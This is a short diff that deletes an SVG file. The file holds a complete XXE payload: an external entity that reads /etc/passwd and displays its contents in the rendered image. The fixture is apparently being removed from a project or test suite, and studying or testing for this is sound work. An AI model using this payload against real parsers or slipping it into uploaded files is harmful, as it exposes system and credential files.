@@ -1,3 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text x="1" y="5">&xxe;</text></svg>
